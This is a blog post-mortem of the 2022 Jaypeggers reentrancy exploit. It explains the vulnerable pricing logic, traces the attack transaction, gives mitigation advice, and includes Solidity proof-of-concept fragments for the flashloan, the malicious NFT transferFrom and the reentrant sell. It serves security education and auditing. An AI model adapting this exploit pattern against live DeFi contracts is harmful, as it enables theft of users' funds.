---
title: "Jaypeggers Hack 2022"
description: "Jaypeggers 2022 hack post mortem"
pubDate: "Sep 03 2025"
heroImage: "/jaypeggerHack_Hero.webp"
tags: ["defi","solidity","security","reentrancy"]
series: "Smart contract exploits POCs"
seriesOrder: 0
---

# Jaypeggers Exploit (2022)

## Introduction

On December 29, 2022, [Jaypeggers](https://jaypeggers.com/), a protocol designed for tax-loss harvesting in the NFT space, suffered a **reentrancy attack**, resulting in the loss of **15.32 ETH** (approximately $18,000). The stolen assets were laundered using Tornado Cash and Aztec.

You can view the transaction here: [BlockSec Explorer](https://app.blocksec.com/explorer/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6)

## Protocol Overview

Jaypeggers is an Ethereum protocol for tax-loss harvesting.

The key part relevant to the hack is the ability to **buy Jay tokens** with ETH, optionally supplying NFTs. This logic is implemented in the **Jay token contract (ERC20)**:

```solidity
function buyJay(
    address[] calldata erc721TokenAddress,
    uint256[] calldata erc721Ids,
    address[] calldata erc1155TokenAddress,
    uint256[] calldata erc1155Ids,
    uint256[] calldata erc1155Amounts
) public payable { ... }
```

Key points:

* The contract mints Jay tokens based on the ETH submitted.
* The price is determined using `ETHtoJAY(msg.value)`:

```solidity
function ETHtoJAY(uint256 value) public view returns (uint256) {
    return value.mul(totalSupply()).div(address(this).balance.sub(value));
}
```

* Essentially, **Jay price = contract’s ETH balance ÷ Jay supply**.

There is also a **sell function**:

```solidity
function sell(uint256 value) public { ... }
```

This burns the sold Jay tokens and transfers ETH back to the seller, taking fees for the developer.


When buying Jay with NFTs, the following function is triggered:

```solidity
function buyJayWithERC721(
    address[] calldata _tokenAddress,
    uint256[] calldata ids
) internal {
    for (uint256 id = 0; id < ids.length; id++) {
        IERC721(_tokenAddress[id]).transferFrom(
            msg.sender,
            address(this),
            ids[id]
        );
    }
}
```

This calls the NFT’s `transferFrom` function, transferring NFTs to the Jay contract.

## The Vulnerability

The vulnerability arises during NFT transfers.

* When `transferFrom` is called, it **opens the door for reentrancy**.
* A malicious user can deploy a **malicious NFT contract** that calls back into the Jay contract during `transferFrom`.

### How the Exploit Works

* Recall the **Jay price formula**: it depends on the vault ETH balance.
* When buying Jay, ETH is sent first, **temporarily altering the price** before the Jay supply is updated.

The hacker:

1. Buys some Jay tokens at the correct price.
2. Executes a large purchase using a **malicious NFT** that overrides `transferFrom`.
3. Exploits reentrancy to **sell previously bought Jay tokens at a higher price**, profiting from the temporary price manipulation.
4. Finalizes by selling tokens bought during the exploit, further draining the vault.

## Exploit Step by Step

Using BlockSec Phalcon, the transaction unfolds as follows:

![Profit](/jaypegger/jaypegger_phalcon01.webp)

1. **Flashloan**
jaypegger_phalcon01
![Step 1 – Flashloan](/jaypegger/jaypegger_phalcon02.webp)

The hacker flashloaned **72.5 ETH** via Balancer to fund the exploit.

2. **First (Legit) Buy**

![First buy](/jaypegger/jaypegger_phalcon03.webp)

Hacker buys **13,584 Jay tokens** for 22 ETH (price ≈ 0.00162 ETH per Jay).

3. **Second Buy with NFT & Reentrancy**

![Reentrancy buy](/jaypegger/jaypegger_phalcon04.webp)

* Hacker spends **50.5 ETH** with a malicious NFT.
* Sells the 13,584 Jay tokens at a higher price, receiving **41.659 ETH**.
* Receives **4,313,025 Jay tokens** due to the vault being drained, further lowering the Jay price.

4. **Sell Exploit Tokens**

![Sell exploit tokens](/jaypegger/jaypegger_phalcon05.webp)
* Sells 4,313,025 Jay tokens for **44.11 ETH**.

5. **Repay Flashloan**

![Repay flashloan](/jaypegger/jaypegger_phalcon06.webp)
Net profit: **≈13 ETH**.

* The hacker repeated the exploit **two more times**, draining more ETH from the vault.

## PoC Description

A Foundry project replicates the hack: [GitHub Repo](https://github.com/tibthecat/HackReplay_Jaypeggers_202212)
Steps to replay:

1. Flashloan

```solidity
        // flashloan        
        IVault balancerVault = IVault(balancerVaultAddress);       
        IERC20[] memory tokens = new IERC20[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = IERC20(address(WETH)); // WETH;
        amounts[0] = amountFlashloan; // borrow amountFlashloan WETH
        balancerVault.flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, "");
```
2. First buy
   
```solidity
        address[] memory erc721TokenAddress; 
        uint256[] memory erc721Ids;
        address[] memory erc1155TokenAddress;
        uint256[] memory erc1155Ids;
        uint256[] memory erc1155Amounts;

        // 1st buy that is legit, get some Jay tokens
        uint JayBalance = Jay.balanceOf(address(this));
        Jay.buyJay {value: amount1}(
            erc721TokenAddress,
            erc721Ids,
            erc1155TokenAddress,
            erc1155Ids,
            erc1155Amounts
        );
```

3. Second buy with reentrancy exploit

```solidity 
        // 2nd buy with NFT to exploit reentrancy
        erc721TokenAddress = new address[](1);
        erc721Ids = new uint256[](1);
        erc721TokenAddress[0] = address(this);
        erc721Ids[0] = 1; 

        // buyjay will call transferFrom on the NFT, which will reenter sell
        // as ETH have been sent to Jay contract, we will be able to sell at a much bigger price
        Jay.buyJay {value: amount2}(
            erc721TokenAddress,
            erc721Ids,
            erc1155TokenAddress,
            erc1155Ids,
            erc1155Amounts
        );
```

```solidity
    function transferFrom(address from, address to, uint256 tokenId) external {
        // reenter sell
        JaypeggersV1 Jay = JaypeggersV1(jaypeggersAddress);
        Jay.approve(jaypeggersAddress,jayBought);
        Jay.sell(jayBought);
        
    }
```

## Root Cause Analysis

This vulnerability is **common in DeFi contracts**.

* Static analysis tools like **Slither** could have detected it.
* Proper auditing should have caught it.

**Lessons for developers and auditors**:

* Always protect functions from **reentrancy** using modifiers like `nonReentrant`.
* Restrict inputs strictly (e.g., allow only specific NFT contracts).

## Mitigation & Fixes

* The current code fixes the vulnerability using a **`nonReentrant` modifier**.
* Best practices:

  * Follow **checks-effects-interactions pattern**
  * Limit allowed inputs for functions
  * Use proper unit testing and static analysis

## Takeaways

* Reentrancy vulnerabilities remain **critical in DeFi**.
* Price manipulation can occur when **ETH is sent before state updates**.
* Combining **flashloans with reentrancy** amplifies risks.
* Proper auditing, modifiers, and input restrictions are essential to prevent similar exploits.

---

*This analysis is for educational purposes only. Always conduct your own research before interacting with smart contracts.*
